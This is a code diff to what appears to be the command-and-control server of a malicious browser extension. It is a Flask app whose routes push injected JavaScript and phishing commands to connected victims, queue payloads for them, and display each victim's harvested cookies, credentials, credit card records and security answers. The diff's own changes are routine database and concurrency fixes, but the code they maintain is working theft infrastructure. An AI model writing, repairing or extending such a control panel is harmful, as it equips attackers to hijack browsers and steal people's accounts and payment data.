@@ -1,3 +1,5 @@
+import eventlet
+eventlet.monkey_patch()
 from flask import Flask, render_template, request, redirect, url_for
 from forms import LoginForm
 from flask_login import logout_user, login_user, login_required, LoginManager, UserMixin
@@ -41,9 +43,11 @@ def login():
 @app_flask.route('/attackmode', methods=['GET', 'POST'])
 @login_required
 def attack_mode():
-    with database.getConn() as cur:
+    conn = database.getConn()
+    with conn.cursor() as cur:
         cur.execute("SELECT * FROM Client")
         data = cur.fetchall()
+        conn.close()
     active_users = [i[0] for i in app.connected_clients]
     return render_template('index2.html', data=data, active_users=active_users)
 
@@ -66,6 +70,7 @@ def sendjs():
     a = request.form['js']
     b = request.form['id']
     c = a + '\n' + b
+    #add_js_command(b, a)
     # if active tell extension to send
     if (check_status(b)):
         return c
@@ -80,6 +85,7 @@ def phish():
     e = "Phish" + request.form['number']
     f = d + '\n' + e
     # if active tell extension to send
+    # add_phish_command(d, e)
     if (check_status(d)):
         return f
     else:
@@ -90,7 +96,8 @@ def phish():
 @app_flask.route('/getinfo', methods=['POST'])
 def getinfo():
     userid = int(request.form['id'])
-    with database.getConn() as cur:
+    conn = database.getConn()
+    with conn.cursor() as cur:
         cur.execute('SELECT * FROM Client WHERE ID = (%s)', (userid,))
         record = cur.fetchone()
         cur.execute('SELECT * FROM Cookies WHERE CID = (%s)', (userid,))
@@ -101,15 +108,17 @@ def getinfo():
         creditcards = cur.fetchall()
         cur.execute('SELECT * FROM SecurityQuestions WHERE CID = (%s)', (userid,))
         questions = cur.fetchall()
+        conn.close()
+
     return render_template('result.html', data=record, cookies=cookies, credentials=credentials,
                            creditcards=creditcards, questions=questions)
 
 
 def update_payload(id, text):
-    with database.getConn() as cur:
+    conn = database.getConn()
+    with conn.cursor() as cur:
         cur.execute("UPDATE Client SET NextPayload = concat(NextPayload, (%s), '\n') WHERE ID = (%s)", (text, id))
-        cur.commit()
-
+        conn.close()
 
 def check_status(user):
     active_users = [i[0] for i in app.connected_clients]
